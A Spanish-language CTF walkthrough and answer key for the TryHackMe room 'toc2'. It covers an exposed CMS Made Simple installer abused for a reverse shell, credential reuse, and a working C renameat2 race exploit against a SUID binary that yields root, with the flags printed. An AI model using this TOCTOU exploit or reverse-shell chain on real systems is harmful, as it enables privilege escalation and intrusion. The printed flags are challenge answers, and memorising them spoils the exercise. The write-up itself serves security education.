# toc2

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Explotación | toc2 | https://tryhackme.com/room/toc2 | 02 Level Medium | TryHackMe | CMS Made Simple 2.1.6, binario SUID, race condition (TOCTOU), renameat2 | Compromiso total del host (user → root) |

---

**Contexto:** La sala **toc2** es un CTF boot2root de dificultad media centrado en una **condición de carrera (TOCTOU)**. Tras enumerar el servicio web (CMS Made Simple 2.1.6 con su instalador expuesto), se obtiene una shell como `www-data` abusando del panel de administración. El texto `new_machine.txt` revela la contraseña de `frank`, y un binario SUID llamado `readcreds` que usa `access()` y después `open()` sobre el mismo fichero es explotado mediante intercambio continuo de archivos con la syscall `renameat2` para leer `root_password_backup`. El reto es "a setup... Can you get the flags in time?" y finaliza con acceso root.

## Solucionario

### Task 1: Get Connected / Conexión
**Explicación:**

Para resolver la sala hay que conectarse a la red de TryHackMe mediante OpenVPN y desplegar la máquina, que tarda hasta 5 minutos en arrancar.

| Pregunta | Respuesta |
|----------|-----------|
| Connect to the TryHackMe OpenVPN | `No answer needed` |

### Task 2: Exploit the Machine / Explotar la máquina
**Explicación:**

Se enumera la máquina con `nmap` y se descubren los puertos 22 (SSH) y 80 (HTTP). El `robots.txt` revela `/cmsms/cmsms-2.1.6-install.php` y una nota que deja la tarea de acabar de configurar el CMS y la base de datos `cmsmsdb`. El index muestra credenciales por defecto (`cmsmsuser:devpass`). Se completa la instalación de CMS Made Simple 2.1.6 a través de su asistente (usando Burp Suite / FoxyProxy para los pasos POST del instalador) y, una vez instalado, se accede al panel `/cmsms/admin/login.php` donde se obtiene una **reverse shell** como `www-data`.

```bash
nmap -sC -sV <IP>
curl -s http://<IP>/robots.txt
nc -nlvp 1234
# Desde la sesión www-data:
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Con la shell se lee `/home/frank/user.txt`:

```bash
www-data@toc:/home/frank$ cat user.txt
thm{63616d70657276616e206c696665}
```

El fichero `new_machine.txt` indica que la contraseña de la nueva máquina de `frank` es `password`, lo que permite hacer `su frank` y llegar al directorio `/home/frank/root_access`, donde vive el binario SUID `readcreds` con su fuente `readcreds.c` y el fichero protegido `root_password_backup`.

| Pregunta | Respuesta |
|----------|-----------|
| Find and retrieve the user.txt flag | `thm{63616d70657276616e206c696665}` |
| Escalate your privileges and acquire root.txt | `thm{7265616c6c696665}` |

### Task 3: Further Exploration / Exploración adicional
**Explicación:**

La escalada se basa en la **race condition** del binario SUID `readcreds`: su código hace `if (!access(argv[1], R_OK)) { sleep(1); file_data = open(argv[1], O_RDONLY); }`. Entre la comprobación `access()` y la llamada `open()` hay una ventana temporal en la que se puede reemplazar el fichero objetivo. Compilando un explotador que ejecuta en bucle `syscall(SYS_renameat2, ..., RENAME_EXCHANGE)` y corriéndolo en paralelo con `readcreds root_password_backup`, se termina leyendo las credenciales root:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

```bash
frank@toc:~/root_access$ ln -s root_password_backup hax
frank@toc:~/root_access$ touch a
frank@toc:~/root_access$ gcc rename.c -o racer
frank@toc:~/root_access$ ./racer hax a &
frank@toc:~/root_access$ ./readcreds hax
Root Credentials:  root:aloevera
```

Con las credenciales se ejecuta `su root` y se lee la flag final:

```bash
root@toc:~# cat /root/root.txt
thm{7265616c6c696665}
```

Para profundizar se recomienda el vídeo de LiveOverflow sobre esta vulnerabilidad y su remediación, y la entrada de Wikipedia sobre condiciones de carrera (TOCTOU).

| Pregunta | Respuesta |
|----------|-----------|
| I now understand where to find more information on this kind of vulnerability | `No answer needed` |

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Connect to the TryHackMe OpenVPN | `No answer needed` |
| 2 | Find and retrieve the user.txt flag | `thm{63616d70657276616e206c696665}` |
| 2 | Escalate your privileges and acquire root.txt | `thm{7265616c6c696665}` |
| 3 | I now understand where to find more information on this kind of vulnerability | `No answer needed` |

---

**Metodología:** Enumeración web (robots.txt, CMS Made Simple 2.1.6), instalación del CMS para obtener una reverse shell como `www-data`, lectura de credenciales en `new_machine.txt` para pivotar al usuario `frank`, y explotación de una condición de carrera TOCTOU en el binario SUID `readcreds` mediante `renameat2` para escalar a root.

### Cadena de ataque / Attack Chain

```
nmap → robots.txt /cmsms/cmsms-2.1.6-install.php → instalación de CMSMS → shell www-data → user.txt → credenciales en new_machine.txt → su frank → binario SUID readcreds (access/open TOCTOU) → race con renameat2 → root_password_backup → su root → root.txt
```

**Learning chain:** Reconocimiento web → explotación del instalador de CMS → shell inicial → pivote horizontal → análisis de código SUID → condición de carrera → escalada total.

**Lección:** *Una comprobación de permisos (access) seguida de un uso posterior (open) deja una ventana TOCTOU explotable: la verificación y el uso deben atarse a un único manejador para ser seguras.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1059 Command and Scripting Interpreter · T1068 Exploitation for Privilege Escalation.

**Fuente:** [TryHackMe - toc2](https://tryhackme.com/room/toc2)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.